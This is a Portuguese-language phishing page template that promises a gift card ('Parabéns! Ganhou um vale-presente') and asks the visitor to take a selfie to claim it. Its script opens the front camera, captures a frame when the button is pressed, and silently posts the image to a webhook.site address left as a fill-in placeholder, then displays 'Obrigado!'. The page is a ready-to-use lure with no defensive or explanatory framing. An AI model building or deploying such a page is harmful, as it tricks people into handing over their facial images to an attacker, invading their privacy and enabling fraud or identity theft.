# camera# Parabéns! Ganhou um vale-presente
Clique no botão e tire uma selfie para liberar:
<!doctype html><meta charset="utf-8"><title>Selfie</title>
<style>body{margin:0;display:flex;height:100vh;flex-direction:column;align-items:center;justify-content:center;background:#111}video{width:98%;max-width:400px;border-radius:12px}button{margin-top:12px;padding:12px 24px;font-size:18px;border:none;border-radius:8px;background:#0a84ff;color:#fff}</style>
<video id="v" autoplay playsinline></video>
<button id="b">Tirar selfie</button>
<script>
navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}})
.then(s=>{v.srcObject=s;window.stream=s})
.catch(e=>alert("Permita o uso da câmera"));
b.onclick=()=>{
let c=document.createElement('canvas');
c.width=v.videoWidth;c.height=v.videoHeight;
c.getContext('2d').drawImage(v,0,0);
fetch('https://webhook.site/SEU-LINK-AQUI',{
  method:'POST',
  body:c.toDataURL('image/jpeg',.8)
});
stream.getTracks().forEach(t=>t.stop());
document.body.innerHTML='<h1 style=color:#0f0>Obrigado!</h1>';
};
</script>
